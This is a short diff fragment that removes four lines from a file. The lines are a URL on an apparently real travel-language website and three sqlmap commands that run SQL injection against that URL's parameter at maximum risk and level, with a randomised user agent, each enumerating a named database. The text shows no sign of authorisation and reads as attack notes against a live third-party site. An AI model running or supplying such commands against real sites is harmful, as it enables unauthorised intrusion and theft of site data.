@@ -1,4 +1,0 @@
-http://travel-language.com/tl/travel/script/goto.php?&url=5351
-python ../sqlmap/sqlmap.py -u http://travel-language.com/tl/travel/script/goto.php?&url=5351 --risk 3 --level 5 --batch --random-agent -D information_schema
-python ../sqlmap/sqlmap.py -u http://travel-language.com/tl/travel/script/goto.php?&url=5351 --risk 3 --level 5 --batch --random-agent -D test
-python ../sqlmap/sqlmap.py -u http://travel-language.com/tl/travel/script/goto.php?&url=5351 --risk 3 --level 5 --batch --random-agent -D winasansapan
